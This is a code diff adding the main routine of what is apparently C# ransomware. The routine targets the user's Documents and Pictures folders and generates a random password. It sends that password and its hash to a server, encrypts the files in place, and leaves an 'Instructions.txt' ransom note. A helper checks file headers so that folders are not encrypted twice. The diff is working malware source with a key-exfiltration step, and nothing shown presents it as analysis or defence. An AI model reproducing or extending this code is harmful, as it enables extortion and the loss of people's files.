@@ -153,4 +153,71 @@ class Program
 
         File.Replace(tempFilePath, filePath, null); // Replace the original file with the encrypted file
     }
+
+    static bool IsFolderEncrypted(string folderPath, List<string> excludedExtensions)
+    {
+        var files = Directory.GetFiles(folderPath);
+        byte[] header = Encoding.UTF8.GetBytes("EncryptedFile00");
+        byte[] existingHeader = new byte[header.Length];
+
+        foreach (var file in files)
+        {
+            if (!excludedExtensions.Any(ext => file.EndsWith(ext)))
+            {
+                using (FileStream inputFile = File.OpenRead(file))
+                {
+                    if (inputFile.Length > existingHeader.Length)
+                    {
+                        inputFile.Read(existingHeader, 0, existingHeader.Length);
+                        if (existingHeader.SequenceEqual(header))
+                        {
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+
+        return false;
+    }
+
+    static void Main()
+    {
+        string userFolderPath = Environment.GetEnvironmentVariable("USERPROFILE"); // root folder
+        List<string> foldersToEncrypt = new List<string>
+        {
+            Path.Combine(userFolderPath, "Documents"), // folders to encrypt, more can be added
+            Path.Combine(userFolderPath, "Pictures")
+        };
+        List<string> excludedExtensions = new List<string> { ".cs", ".exe", ".js" }; // Example excluded extensions
+
+        bool isEncrypted = foldersToEncrypt.Any(folderPath => IsFolderEncrypted(folderPath, excludedExtensions));
+
+        if (!isEncrypted)
+        {
+            // Generate a random password
+            string password = GenerateRandomPassword(12);
+
+            // Send password and its hash to the server
+            string hash = ComputeHash(password);
+            SendPasswordToServer(password, hash);
+
+            // Encryption process
+            Parallel.ForEach(foldersToEncrypt, folderPath =>
+            {
+                string hashFilePath = Path.Combine(folderPath, "passwordHash.txt");
+                File.WriteAllText(hashFilePath, hash);
+                EncryptFolder(folderPath, password, hashFilePath, excludedExtensions);
+                string text = Path.Combine(folderPath, "Instructions.txt");
+                File.WriteAllText(text, "Your files have been encrypted... dang.");
+            });
+        }
+        else
+        {
+            Console.WriteLine("Files are already encrypted. Skipping encryption process...");
+        }
+    }
 }
+
+
+    
